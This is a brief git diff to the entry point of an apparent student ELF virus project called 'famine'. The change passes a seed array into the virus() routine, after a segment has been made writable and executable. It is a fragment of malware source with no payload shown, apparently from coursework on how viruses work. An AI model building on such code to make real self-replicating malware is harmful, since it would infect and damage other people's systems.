@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/12 01:53:23 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/12 18:07:09 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -44,7 +44,9 @@ void	_start(void)
 	if (famine_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
 		famine_exit(dprintf(2, "failed to read elf header\n"));
 
-	virus();
+	uint64_t seed[2] = {0l, ~0l};
+
+	virus(seed);
 	famine_exit(0);
 	__builtin_unreachable();
 }
